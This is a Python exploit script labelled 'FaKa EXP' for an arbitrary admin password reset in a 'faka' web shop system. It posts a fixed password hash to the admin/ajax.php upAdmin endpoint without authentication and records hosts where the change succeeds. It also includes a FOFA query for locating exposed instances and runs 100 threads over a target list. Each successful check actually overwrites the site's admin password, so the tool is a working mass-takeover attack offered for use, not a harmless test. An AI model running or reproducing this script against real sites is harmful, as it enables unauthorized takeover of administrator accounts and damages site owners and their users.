#-*- coding: utf-8 -*-
import requests,json,sys,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
from rich.console import Console

def banner():
    test = """

███████╗ █████╗ ██╗  ██╗ █████╗ 
██╔════╝██╔══██╗██║ ██╔╝██╔══██╗
█████╗  ███████║█████╔╝ ███████║
██╔══╝  ██╔══██║██╔═██╗ ██╔══██║
██║     ██║  ██║██║  ██╗██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
                    tag:  FaKa EXP                                       
    @version: 1.0.0   @author: jcad            
"""
    print(test)

console = Console()

# FOFA: body="template/zongzi/js/jquery.validate.min.js"


def exp(target):
    url = f"{target}/admin/ajax.php?act=upAdmin"
    headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close",
               "X-REQUESTED-WITH": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded"}
    data = {"p": "9b42053ea2ab4a7af75e6a3e701855bd"}
    try:
        res = requests.post(url, headers=headers, data=data,verify=False,timeout=10).text
        dict_res = json.loads(res.encode("utf-8"))
        if dict_res["code"] == 1 and dict_res["msg"] == "修改成功":
            console.print(f"[+] {target} is vulnable",style="bold green")
            with open("result_faka.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            console.print(f"[-] {target} is not vulnable",style="bold red")
    except:
        console.print(f"[*] {target} server error",style="bold yellow")

def main():
    banner()
    parser = argparse.ArgumentParser(description='任意密码重置')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)  # 自己指定的线程数
        mp.map(exp, url_list)  # printNumber 函数 target 目标列表
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()